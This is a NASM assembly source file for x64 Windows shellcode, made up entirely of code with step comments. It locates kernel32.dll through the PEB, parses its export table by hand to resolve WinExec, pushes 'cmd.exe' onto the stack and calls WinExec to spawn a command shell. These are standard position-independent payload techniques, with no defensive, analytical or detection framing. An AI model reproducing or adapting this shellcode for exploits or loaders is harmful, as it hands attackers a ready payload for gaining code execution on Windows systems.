BITS 64
DEFAULT REL

section .text
global _start

_start:
    ; --- Setup Stack Alignment & Shadow Space ---
    push rbp
    mov rbp, rsp
    and rsp, ~0xF          ; Align stack to 16 bytes for Windows x64 ABI
    sub rsp, 0x30          ; Allocate shadow space (4 registers + padding)

    ; --- 1. Locate kernel32.dll via PEB ---
    xor rbx, rbx
    mov rbx, [gs:0x60]     ; RBX = PEB pointer
    mov rbx, [rbx + 0x18]  ; RBX = PEB_LDR_DATA
    mov rbx, [rbx + 0x20]  ; RBX = InMemoryOrderModuleList (1st entry: executable)
    mov rbx, [rbx]         ; RBX = 2nd entry (ntdll.dll)
    mov rbx, [rbx]         ; RBX = 3rd entry (kernel32.dll)
    mov r8,  [rbx + 0x20]  ; R8 = DllBase of kernel32.dll

    ; --- 2. Parse kernel32.dll Export Table ---
    mov ebx, [r8 + 0x3C]   ; EBX = PE Header Offset
    add rbx, r8            ; RBX = PE Header Address
    mov eax, [rbx + 0x88]  ; EAX = Export Table RVA
    add rax, r8            ; RAX = Export Table Address
    
    mov r9d, [rax + 0x20]  ; R9D = AddressOfNames RVA
    add r9,  r8            ; R9 = AddressOfNames Address
    mov r10d, [rax + 0x24] ; R10D = AddressOfNameOrdinals RVA
    add r10, r8            ; R10 = AddressOfNameOrdinals Address
    mov r11d, [rax + 0x1C] ; R11D = AddressOfFunctions RVA
    add r11, r8            ; R11 = AddressOfFunctions Address

    ; --- 3. Loop to find "WinExec" string ---
    xor rcx, rcx           ; RCX = Index counter

.loop_names:
    mov edx, [r9 + rcx*4]  ; EDX = Name RVA
    add rdx, r8            ; RDX = Name string Address
    
    ; Check if string starts with 'WinExec\0'
    ; 'WinExec' in hex: 0x636578456e6957 (Little Endian: W i n E x e c)
    mov rax, [rdx]
    mov rbx, 0x00636578456e6957 ; "WinExec\0"
    cmp rax, rbx
    je .found_winexec
    inc rcx
    jmp .loop_names

.found_winexec:
    ; --- 4. Resolve WinExec Address via Ordinal ---
    xor rdx, rdx
    mov dx, [r10 + rcx*2]  ; DX = Ordinal
    mov eax, [r11 + rdx*4] ; EAX = Function RVA
    add rax, r8            ; RAX = Actual Address of WinExec

    ; --- 5. Call WinExec("cmd.exe", SW_SHOWNORMAL) ---
    ; WinExec Proto: UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
    ; x64 Call Convention: RCX = lpCmdLine, RDX = uCmdShow
    
    ; Push "cmd.exe\0" to stack
    xor rdx, rdx
    push rdx               ; Null terminator
    mov rdx, 0x6578652e646d63 ; "cmd.exe"
    push rdx
    mov rcx, rsp           ; RCX = Pointer to "cmd.exe"
    
    mov rdx, 1             ; RDX = SW_SHOWNORMAL (1)
    call rax               ; Execute WinExec!

    ; --- Clean Exit ---
    mov rsp, rbp
    pop rbp
    ret